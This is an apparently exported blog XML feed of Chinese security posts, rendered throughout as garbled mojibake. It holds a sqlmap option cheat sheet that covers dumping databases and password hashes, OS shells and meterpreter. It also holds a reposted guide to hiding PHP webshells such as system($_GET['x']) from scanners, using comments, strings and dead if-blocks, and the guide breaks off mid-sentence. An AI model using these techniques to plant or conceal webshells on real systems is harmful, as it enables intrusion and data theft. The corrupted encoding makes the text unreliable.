ALLæ“ä½œç¬¦ï¼ˆä»¥ALLå¼€å¤´çš„æ“ä½œç¬¦ï¼‰éå¸¸å¤æ€ªã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæŸ¥è¯¢ä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡ALLæ“ä½œç¬¦ï¼Œè€Œä¸”ä¸èƒ½å’Œå…¶ä»–æ“ä½œç¬¦æ··ç”¨ã€‚(5) å…¶ä»–æ›´å¤šæœç´¢æŠ€å·§å¯å‚è€ƒï¼šhttps://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text= å‚è€ƒé“¾æ¥http://baike.so.com/doc/6950859-7173260.htmlhttp://blog.jobbole.com/72211/http://www.nxadmin.com/web/120.html éšæ—¶æ›´æ–°ï¼Œæœ‰è¯¯ä¹‹å¤„ï¼Œæ¬¢è¿æŒ‡å‡ºï¼Œæ¬¢è¿äº¤æµã€‚]]></content>
      <categories>
        <category>ç¥å™¨</category>
      </categories>
      <tags>
        <tag>Search</tag>
        <tag>Google hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapå¤‡å¿˜å½•ï¼ˆ1ï¼‰]]></title>
    <url>%2F2016%2F11%2F05%2F4%2F</url>
    <content type="text"><![CDATA[åŸºç¡€SQLmapæ˜¯ä¸€æ¬¾ç”¨æ¥æ£€æµ‹ä¸åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„å…è´¹å¼€æºå·¥å…·ã€‚ä¸»è¦å¯ä»¥ç”¨æ¥åˆ¤æ–­å¯æ³¨å…¥çš„å‚æ•°ã€æ³¨å…¥çš„æ–¹å¼ï¼Œè¯†åˆ«æ•°æ®åº“ç§ç±»ï¼Œè¯»å–æ•°æ®ï¼Œå‘½ä»¤æ‰§è¡Œç­‰ä½œç”¨ã€‚æ³¨å…¥æ¨¡å¼ï¼šåŸºäºå¸ƒå°”çš„ç›²æ³¨ã€åŸºäºæ—¶é—´çš„ç›²æ³¨ã€åŸºäºæŠ¥é”™æ³¨å…¥ã€è”åˆæŸ¥è¯¢æ³¨å…¥ã€å †æŸ¥è¯¢æ³¨å…¥æ”¯æŒçš„æ•°æ®åº“ï¼šMySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDBæµ‹è¯•çº§åˆ«ï¼ˆ7çº§ï¼‰ï¼š0ã€åªæ˜¾ç¤ºpythoné”™è¯¯ä»¥åŠä¸¥é‡çš„ä¿¡æ¯ã€‚1ã€åŒæ—¶æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯å’Œè­¦å‘Šä¿¡æ¯ã€‚é»˜è®¤ä¸º1çº§2ã€åŒæ—¶æ˜¾ç¤ºdebugä¿¡æ¯ã€‚3ã€åŒæ—¶æ˜¾ç¤ºæ³¨å…¥çš„payloadã€‚ï¼ˆæ¨èï¼‰4ã€åŒæ—¶æ˜¾ç¤ºHTTPè¯·æ±‚ã€‚5ã€åŒæ—¶æ˜¾ç¤ºHTTPå“åº”å¤´ã€‚6ã€åŒæ—¶æ˜¾ç¤ºHTTPå“åº”é¡µé¢ã€‚&nbsp;è¯¦ç»†å‚æ•°ï¼š-is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼‰-dbs æ‰€æœ‰æ•°æ®åº“-current-db ç½‘ç«™å½“å‰æ•°æ®åº“-users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·-current-user å½“å‰æ•°æ®åº“ç”¨æˆ·-random-agent æ„é€ éšæœºuser-agent-passwords æ•°æ®åº“å¯†ç -proxy http://local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç†-time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰Targetï¼ˆç›®æ ‡ï¼‰ï¼šè®¾ç½®ç›®æ ‡URLã€‚-d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚-u URL, â€“url=URL ç›®æ ‡URLã€‚-l LIST ä»Burpæˆ–WebScarabä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚-r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥HTTPè¯·æ±‚ã€‚-g GOOGLEDORK å¤„ç†Google dorkçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚-c CONFIGFILE ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚&nbsp;Requestï¼ˆè¯·æ±‚ï¼‰ï¼šç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚-data=DATA é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²-cookie=COOKIE HTTP Cookieå¤´-cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„cookieæ³¨å…¥-drop-set-cookie å¿½ç•¥å“åº”çš„Set â€“ Cookieå¤´ä¿¡æ¯-user-agent=AGENT æŒ‡å®š HTTP User â€“ Agentå¤´-random-agent ä½¿ç”¨éšæœºé€‰å®šçš„HTTP User â€“ Agentå¤´-referer=REFERER æŒ‡å®š HTTP Refererå¤´-headers=HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„HTTPå¤´-auth-type=ATYPE HTTPèº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest or NTLM)-auth-cred=ACRED HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰-auth-cert=ACERT HTTPè®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰-proxy=PROXY ä½¿ç”¨HTTPä»£ç†è¿æ¥åˆ°ç›®æ ‡URL-proxy-cred=PCRED HTTPä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰-ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„HTTPä»£ç†-delay=DELAY åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’-timeout=TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30ç§’ï¼‰-retries=RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰-scope=SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼-safe-url=SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„urlåœ°å€-safe-freq=SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„URLEnumerationï¼ˆæšä¸¾ï¼‰ï¼šç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®or è¿è¡Œæ„é€ çš„sqlè¯­å¥-b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†-current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·-current-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“-is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA-users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·-passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ-privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™-roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²-dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“-D DBname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“å-T TBLname è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“è¡¨ï¼ˆå¦‚ï¼š-T tablename â€“columnsï¼‰-tables æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨-columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—-dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹-dump-all è½¬å‚¨æ‰€æœ‰çš„DBMSæ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®-search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰-C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—-U USER ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·-exclude-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“-start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢-stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢-first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢-last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢-sql-query=QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥-sql-shell æç¤ºäº¤äº’å¼SQLçš„shellOptimizationï¼ˆä¼˜åŒ–ï¼‰ï¼šç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½-o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³â€“predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡ºâ€“keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥â€“null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦â€“threads=THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰Injectionï¼ˆæ³¨å…¥ï¼‰ï¼šç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬-p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰â€“dbms=DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼â€“os=OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼â€“prefix=PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€â€“suffix=SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€â€“tamper=TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®Detectionï¼ˆæ£€æµ‹ï¼‰ï¼šç”¨äºæŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹â€“level=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰â€“risk=RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰â€“string=STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²â€“regexp=REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼â€“text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µTechniquesï¼ˆæŠ€å·§ï¼‰ï¼šç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•â€“technique=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰â€“time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰â€“union-cols=UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥â€“union-char=UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š-f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹Brute forceï¼ˆè›®åŠ›ï¼‰ï¼šè¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥â€“common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨â€“common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼šç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚â€“udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°â€“shared-lib=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚â€“file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶â€“file-write=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶â€“file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰ï¼šç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚â€“os-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤â€“os-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shellâ€“os-pwn è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNCâ€“os-smbrelay ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNCâ€“os-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨â€“priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡â€“msf-path=MSFPATH Metasploit Frameworkæœ¬åœ°çš„å®‰è£…è·¯å¾„â€“tmp-path=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„Windowsæ³¨å†Œè¡¨è®¿é—®ï¼šç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚â€“reg-read è¯»ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼â€“reg-add å†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ®â€“reg-del åˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼â€“reg-key=REGKEY Windowsæ³¨å†Œè¡¨é”®â€“reg-value=REGVAL Windowsæ³¨å†Œè¡¨é¡¹å€¼â€“reg-data=REGDATA Windowsæ³¨å†Œè¡¨é”®å€¼æ•°æ®â€“reg-type=REGTYPE Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»å‹è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚-t TRAFFICFILE è®°å½•æ‰€æœ‰HTTPæµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­-s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®â€“flush-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶â€“fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœâ€“eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´â€“update æ›´æ–°SqlMapâ€“save fileä¿å­˜é€‰é¡¹åˆ°INIé…ç½®æ–‡ä»¶â€“batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚Miscellaneousï¼ˆæ‚é¡¹ï¼‰ï¼šâ€“beep å‘ç°SQLæ³¨å…¥æ—¶æé†’â€“check-payload IDSå¯¹æ³¨å…¥payloadsçš„æ£€æµ‹æµ‹è¯•â€“cleanup SqlMapå…·ä½“çš„UDFå’Œè¡¨æ¸…ç†DBMSâ€“forms å¯¹ç›®æ ‡URLçš„è§£æå’Œæµ‹è¯•å½¢å¼â€“gpage=GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œdorkç»“æœâ€“page-rank Google dorkç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰â€“parse-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯â€“replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ªsqlite3æ•°æ®åº“â€“tor ä½¿ç”¨é»˜è®¤çš„Torï¼ˆVidalia/ Privoxy/ Polipoï¼‰ä»£ç†åœ°å€â€“wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢Optionsï¼ˆé€‰é¡¹ï¼‰ï¼š-version æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º-h, â€“help æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º-v VERBOSE è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰&nbsp;æ³¨å…¥å§¿åŠ¿ï¼šhttp://www.secbox.cn/hacker/6311.htmlhttp://www.secbox.cn/hacker/3789.htmlhttp://404.so/7309.htmlhttp://www.myhack58.com/Article/html/3/7/2016/80301_2.htmhttp://www.qingpingshan.com/pc/aq/154823.htmlè¿‡ç‹—ï¼šhttp://www.freebuf.com/articles/1000.htmlhttp://www.vuln.cn/2086http://www.360doc.com/content/16/0330/05/7944896_546425071.shtmlhttp://www.myhack58.com/Article/html/2/5/2016/76932.htmhttp://blog.csdn.net/qq_29277155/article/details/51193071]]></content>
      <categories>
        <category>ç¥å™¨</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿‡ç‹—æ€»ç»“ï¼ˆè½¬ï¼‰]]></title>
    <url>%2F2016%2F11%2F05%2F5%2F</url>
    <content type="text"><![CDATA[xxç‹—é™æ€æŸ¥æ€å¤§è‡´åˆ†æç›®å‰ï¼Œä¼ ç»Ÿçš„WAFè½¯ä»¶ä¸»è¦é€šè¿‡å®šæ—¶æˆ–æ˜¯ç”±ç®¡ç†å‘˜æ‰‹åŠ¨å¯¹ç½‘ç«™ç¨‹åºè¿›è¡ŒæŸ¥æ€çš„ä¸»åŠ¨æ–¹å¼ä»¥åŠå½“è¯·æ±‚è€…æµè§ˆè¯¥æ–‡ä»¶æ—¶ç”±WAFè½¯ä»¶è¢«åŠ¨çš„æ–¹å¼è¿›è¡ŒæŸ¥æ€ã€‚è€ŒæŸ¥æ€çš„åŸç†ä¸»è¦æ˜¯é€šè¿‡å¯¹ç›®æ ‡æ–‡ä»¶çš„ç‰¹å¾ä¸ç½‘é©¬è§„åˆ™åº“è¿›è¡Œæ¯”å¯¹ã€‚è¿™ç§æŸ¥æ€åŸç†æœ‰å®ƒçš„å±€é™æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è„šæœ¬è¯­è¨€çš„ç‰¹æ€§å¯¹å·²è¢«æŸ¥æ€å‡ºæ¥çš„WebShellè¿›è¡Œä¼ªè£…æˆç±»ä¼¼æ­£å¸¸çš„é¡µé¢ç¨‹åºä»è€Œé¿å¼€WAFè½¯ä»¶çš„æŸ¥æ€ã€‚å› ä¸ºç‹—çš„æŸ¥æ€å¹¶æ²¡æœ‰ç›¸å…³èµ„æ–™æˆ–æ–‡æ¡£ç­‰ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä»ç‹—çš„æŸ¥æ€ä¸­å¾—åˆ°éƒ¨åˆ†ç»“è®ºã€‚åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿™ç§æ–¹æ³•æœ€å¤§çš„å¥½å¤„å°±æ˜¯ç®€å•ã€‚ä½†æ˜¯ï¼Œæ­£åˆ™è¡¨è¾¾å¼æœ€å¤§çš„ç¼ºç‚¹å°±æ˜¯å…¶åªå¯¹å…³é”®å±é™©å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°†å…³é”®å‡½æ•°ç¨å¾®é€šè¿‡æŸç§æ–¹å¼å˜æ¢ä¸€ä¸‹ï¼Œæ­£åˆ™è¡¨è¾¾å¼æ— æ³•æŸ¥æ€äº†ã€‚è€Œä¸”ï¼Œè¿™ç§æ–¹æ³•çš„è¯¯æŠ¥ç‡ä¹Ÿå¾ˆé«˜ã€‚æ‰€ä»¥ï¼Œè¿™ç§æ–¹æ³•çš„æŸ¥æ€æ•ˆæœä¸æ˜¯å¾ˆç†æƒ³ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•æœ€å¤§çš„å¥½å¤„å°±æ˜¯ç®€å•ï¼Œé€Ÿåº¦å¿«ã€‚ä¸€èˆ¬åœ¨æŸ¥æ€webç›®å½•ä¸‹çš„å›¾ç‰‡ç­‰æ–‡ä»¶æ—¶ä½¿ç”¨æ­¤ç§æ–¹æ³•ã€‚åˆ©ç”¨PHPä»£ç åˆ†ææŠ€æœ¯è¿™ç§æ–¹æ³•æœ€å¤§çš„å¥½å¤„æ˜¯è§£å†³äº†æ­£åˆ™æŸ¥æ€è¯¯æŠ¥ç‡è¿‡é«˜çš„é—®é¢˜ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´åˆ†æä¸€ä¸‹æŸ¥æ€å¼•æ“çš„å·¥ä½œåŸç†ï¼š&nbsp;&nbsp;&nbsp;&nbsp;å¯¹PHPæ–‡ä»¶åšé¢„å¤„ç†ï¼Œå»é™¤æ‰æ³¨é‡Šï¼Œç©ºæ ¼ï¼Œç­‰æ²¡æœ‰ç”¨çš„ä¸œè¥¿æˆ‘ä»¬å¯ä»¥åœ¨phpä¸­å†™å…¥ä»¥ä¸‹å†…å®¹&lt;?php/system(â€œ$_get[â€˜xâ€™]â€); /?&gt;ä½¿ç”¨å’Œdç›¾æŸ¥æ€ï¼Œå‘ç°æ²¡æœ‰æŸ¥æ€å‡ºä¸€å¥è¯ã€‚åŸæ¥æŸ¥æ€å¼•æ“åœ¨æŸ¥æ€çš„æ—¶å€™ï¼Œä¼šåšç±»ä¼¼äºç¼–è¯‘å™¨çš„ä¼˜åŒ–ï¼Œå»æ‰ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ã€‚ä¹Ÿè®¸ä½ ä¼šè®¤ä¸ºä»£ç å†™åœ¨æ³¨é‡Šé‡Œï¼Œphpçš„ç¼–è¯‘å™¨ä¹Ÿä¼šåšç±»ä¼¼ä¼˜åŒ–æ“ä½œï¼Œå°†å…¶å»é™¤ã€‚è€Œä¸”ï¼Œä»£ç åœ¨æ³¨é‡Šé‡Œä¹Ÿä¸å¯èƒ½è¿è¡Œçš„ã€‚æ‰€ä»¥ä½ å¯èƒ½ä¼šè®¤ä¸ºçš„æŸ¥æ€æ–¹å¼å¾ˆæ­£ç¡®ã€‚æ—¢ç®€å•åˆé«˜æ•ˆï¼Œä¸ºä¸‹ä¸€æ­¥å¤„ç†é™ä½äº†è´Ÿæ‹…ã€‚ä½†æ˜¯å…¶å®æ˜¯ä¸æ­£ç¡®çš„ã€‚æŸ¥é˜…php manualï¼Œåœ¨PHP 5 &gt;= 5.1.0, PHP 7 ä¸­ï¼Œphpå®˜æ–¹æä¾›äº†ä¸€ä¸ªå‡½æ•°ReflectionClass::getDocCommentã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªå‡½æ•°æœ€ä¸»è¦çš„ä½œç”¨æ˜¯è·å–phpçš„æ³¨é‡Šã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°è·å–æ–‡æ¡£ä¸­æ³¨é‡Šï¼Œç„¶åé€šè¿‡phpçš„åŠ¨æ€å‡½æ•°è°ƒç”¨ç­‰xxxxå„ç§æ–¹æ³•å»æ‰§è¡Œæˆ‘ä»¬æ‰€è·å–åˆ°çš„ä»£ç ã€‚&nbsp;&nbsp;&nbsp;&nbsp;å¯¹ä¸Šä¸€æ­¥é¢„å¤„ç†æ‰€å¾—åˆ°çš„ç»“æœåšè¯æ³•åˆ†æã€‚ä»¥ä¸‹ä»£ç $a=â€œsystem(@$_get[â€˜xâ€™])â€å’Œsystem(@$_get[â€˜xâ€™])æˆ‘ä»¬åˆ†åˆ«å»æŸ¥æ€è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚ç»“æœæ˜¾è€Œæ˜“è§ï¼Œç¬¬ä¸€ä¸ªæ²¡æœ‰åŠæ³•å»æŸ¥æ€ï¼Œè€Œç¬¬äºŒä¸ªä¸€å®šä¼šè¢«æŸ¥æ€ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼ŒæŸ¥æ€å¼•æ“ä¼šå¯¹phpæ–‡ä»¶åšè¯æ³•åˆ†æï¼Œç„¶ååªå¯¹ç›¸å…³å‡½æ•°è°ƒç”¨ç­‰å†åšè¿›ä¸€æ­¥æŸ¥æ€ã€‚è€Œç±»ä¼¼äºå­—ç¬¦ä¸²ç­‰è¿™æ ·å˜é‡ï¼ŒæŸ¥æ€å¼•æ“åŸºæœ¬ä¸Šä¼šç›´æ¥å°†å…¶èˆå¼ƒã€‚ä¸å†åšè¿›ä¸€æ­¥åˆ†æã€‚&nbsp;&nbsp;&nbsp;&nbsp;å¯¹ä¸Šä¸€æ­¥ç»“æœè¿›è¡Œè¯­æ³•åˆ†æä»è¿™ä¸€æ­¥å¼€å§‹ï¼ŒæŸ¥æ€å¼•æ“å¼€å§‹å¯¹ç›¸å…³å‡½æ•°çš„è°ƒç”¨è¿›è¡Œè¯­æ³•åˆ†æã€‚åˆ†æå˜é‡ä½œç”¨åŸŸï¼Œå‡½æ•°å‚æ•°è°ƒç”¨ç­‰ã€‚å†ä¸webshellç‰¹å¾åº“è¿›è¡Œæ¯”å¯¹ï¼Œç”¨ä»¥ç¡®å®šæ˜¯å¦ä¸ºwebshellæ–‡ä»¶ã€‚åœ¨æŸ¥æ€å¼•æ“ä¸­ï¼ŒåŸºæœ¬ä¸Šä¼šå¯¹ifç­‰æ¡ä»¶æ§åˆ¶æ¡ä»¶ç›´æ¥è·³è¿‡ï¼Œç›´æ¥åˆ†æé‡Œé¢çš„ä»£ç ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­if (false) { system(â€˜@$_get[â€˜xâ€˜]â€™);}è¿™æ®µä»£ç 